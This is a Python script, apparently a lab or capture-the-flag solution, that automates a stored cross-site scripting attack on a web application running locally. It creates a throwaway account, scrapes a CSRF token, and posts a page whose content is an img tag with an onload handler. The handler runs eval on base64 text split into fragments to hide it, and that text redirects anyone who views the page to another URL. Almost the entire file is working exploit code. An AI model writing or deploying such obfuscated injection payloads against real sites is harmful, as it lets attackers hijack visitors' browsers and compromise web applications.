import requests
import uuid

# Create new user
s = requests.Session()

username = str(uuid.uuid4()).replace('-', '')
password = str(uuid.uuid4())

reg_data = {
    'username': username,
    'password': password,
    'password_confirmation': password,
}

print("Username: %s\nPassword: %s" % (username, password))
print()

s.post('http://127.0.0.1:8080/registration.php', data=reg_data)

new_page_text = s.get('http://127.0.0.1:8080/new_page.php').text
csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
eploit = '''
<img
src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
onload="eval(atob('d2luZG93Lmx' + 'vY2F0aW9uLnJlcG' + 'xhY2UoJ2h0dHA6Ly93ZWIvcGFnZS5waHA/aWQ9MScp'))"
>
'''

eploit_id = str(uuid.uuid4())
page_data = {
    'name': 'eploit_' + eploit_id,
    'content': eploit,
    'csrf_token': csrf_token,
}

response = s.post('http://127.0.0.1:8080/new_page.php', data=page_data)
print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())